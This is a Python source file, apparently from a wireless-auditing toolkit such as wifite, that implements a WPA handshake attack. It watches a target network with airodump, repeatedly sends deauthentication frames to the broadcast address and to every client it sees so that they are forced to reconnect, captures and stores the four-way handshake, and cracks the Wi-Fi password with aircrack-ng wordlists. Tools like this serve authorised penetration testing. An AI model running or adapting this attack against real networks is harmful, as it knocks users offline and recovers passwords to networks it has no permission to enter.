#!/usr/bin/env python
# -*- coding: utf-8 -*-

from model.attack import Attack
from tools.aircrack import Aircrack
from tools.airodump import Airodump
from tools.aireplay import Aireplay
from config import Configuration
from util.color import Color
from util.timer import Timer
from model.handshake import Handshake
from model.wpa_result import CrackResultWPA

import time
import os
import re
from shutil import copy


class AttackWPA(Attack):
    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False

    def run(self):
        """Initiates full WPA handshake capture attack."""

        # Capture the handshake (or use an old one)
        handshake = self.capture_handshake()

        if handshake is None:
            # Failed to capture handshake
            self.success = False
            return self.success

        # Analyze handshake
        Color.pl('\n{+} analysis of captured handshake file:')
        handshake.analyze()

        # Check wordlist
        Color.pl('\n')
        for wordlist in Configuration.wordlists:
            if wordlist is None:
                Color.pl('{!} {O}Not cracking handshake because wordlist is not set')
                self.success = False
                return False

            elif not os.path.exists(wordlist):
                Color.pl('{!} {O}Not cracking handshake because wordlist {R}%s{O} was not found' % wordlist)
                self.success = False
                return False

            Color.pl('{+} {C}Cracking WPA Handshake:{W} Running {C}aircrack-ng{W} with '
                    '{C}%s{W} wordlist' % os.path.split(wordlist)[-1])

        # Crack it
        for wordlist in Configuration.wordlists:
            key = Aircrack.crack_handshake(wordlist, handshake, show_command=False)
            if key is None:
                Color.pl('{!} {R}Failed to crack handshake: {O}%s{R} did not contain password{W}' % wordlist.split(os.sep)[-1])
                self.success = False
            else:
                Color.pl('{+} {G}Cracked WPA Handshake{W} PSK: {G}%s{W}\n' % key)
                self.crack_result = CrackResultWPA(handshake.bssid, handshake.essid, handshake.capfile, key)
                self.crack_result.dump()
                self.success = True
        return self.success

    def capture_handshake(self):
        """Returns captured or stored handshake, otherwise None."""
        handshake = None

        # First, start Airodump process
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      output_file_prefix='wpa') as airodump:

            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'Handshake capture', 'Waiting for target to appear...')
            airodump_target = self.wait_for_target(airodump)

            self.clients = []

            # Try to load existing handshake
            if not Configuration.ignore_old_handshakes:
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = self.load_handshake(bssid=bssid, essid=essid)
                if handshake:
                    Color.pattack('WPA', self.target, 'Handshake capture',
                                  'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
                    Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
                    return handshake

            timeout_timer = Timer(Configuration.wpa_attack_timeout)
            deauth_timer = Timer(Configuration.wpa_deauth_timeout)

            while handshake is None and not timeout_timer.ended():
                step_timer = Timer(1)
                Color.clear_entire_line()
                Color.pattack('WPA',
                              airodump_target,
                              'Handshake capture',
                              'Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (
                                  len(self.clients), deauth_timer, timeout_timer))

                # Find .cap file
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    # No cap files yet
                    time.sleep(step_timer.remaining())
                    continue
                cap_file = cap_files[0]

                # Copy .cap file to temp for consistency
                temp_file = Configuration.temp('handshake.cap.bak')
                copy(cap_file, temp_file)

                # Check cap file in temp for Handshake
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                if handshake.has_handshake():
                    # We got a handshake
                    Color.clear_entire_line()
                    Color.pattack('WPA',
                                  airodump_target,
                                  'Handshake capture',
                                  '{G}Captured handshake{W}')
                    Color.pl('')
                    break

                # There is no handshake
                handshake = None
                # Delete copied .cap file in temp to save space
                os.remove(temp_file)

                # Look for new clients
                airodump_target = self.wait_for_target(airodump)
                for client in airodump_target.clients:
                    if client.station not in self.clients:
                        Color.clear_entire_line()
                        Color.pattack('WPA',
                                      airodump_target,
                                      'Handshake capture',
                                      'Discovered new client: {G}%s{W}' % client.station)
                        Color.pl('')
                        self.clients.append(client.station)

                # Send deauth to a client or broadcast
                if deauth_timer.ended():
                    self.deauth(airodump_target)
                    # Restart timer
                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                # Sleep for at-most 1 second
                time.sleep(step_timer.remaining())
                continue  # Handshake listen+deauth loop

        if handshake is None:
            # No handshake, attack failed.
            Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (
                Configuration.wpa_attack_timeout))
        else:
            # Save copy of handshake to ./hs/
            self.save_handshake(handshake)

        return handshake

    @staticmethod
    def load_handshake(bssid, essid):
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        if essid:
            essid_safe = re.escape(re.sub('[^a-zA-Z\d]', '', essid))
        else:
            essid_safe = '[a-zA-Z0-9]+'
        bssid_safe = re.escape(bssid.replace(':', '-'))
        date = r'\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}'
        get_filename = re.compile(r'handshake_%s_%s_%s\.cap' % (essid_safe, bssid_safe, date))

        for filename in os.listdir(Configuration.wpa_handshake_dir):
            cap_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if os.path.isfile(cap_filename) and re.match(get_filename, filename):
                return Handshake(capfile=cap_filename, bssid=bssid, essid=essid)

        return None

    @staticmethod
    def save_handshake(handshake):
        """
            Saves a copy of the handshake file to hs/
            Args:
                handshake - Instance of Handshake containing bssid, essid, capfile
        """
        # Create handshake dir
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        # Generate filesystem-safe filename from bssid, essid and date
        if handshake.essid and type(handshake.essid) is str:
            essid_safe = re.sub('[^a-zA-Z\d]', '', handshake.essid)
        else:
            essid_safe = 'UnknownEssid'
        bssid_safe = handshake.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S') # Convert date and time duration from 1970-01-02 07:30:00 until the file created into seconds
        cap_filename = f'handshake_{essid_safe}_{bssid_safe}_{date}.cap'
        cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)

        if Configuration.wpa_strip_handshake:
            Color.p('{+} {C}stripping{W} non-handshake packets, saving to {G}%s{W}...' % cap_filename)
            handshake.strip(outfile=cap_filename)
        else:
            Color.p('{+} saving copy of {C}handshake{W} to {C}%s{W} ' % cap_filename)
            copy(handshake.capfile, cap_filename)
        Color.pl('{G}saved{W}')
        # Update handshake to use the stored handshake file for future operations
        handshake.capfile = cap_filename

    def deauth(self, target):
        """
            Sends deauthentication request to broadcast and every client of target.
            Args:
                target - The Target to deauth, including clients.
        """

        for client in [None] + self.clients:
            target_name = '*broadcast*' if client is None else client
            Color.clear_entire_line()
            Color.pattack('WPA',
                          target,
                          'Handshake capture',
                          'Deauthing {O}%s{W}' % target_name)
            Aireplay.deauth(target.bssid, client_mac=client, timeout=2)
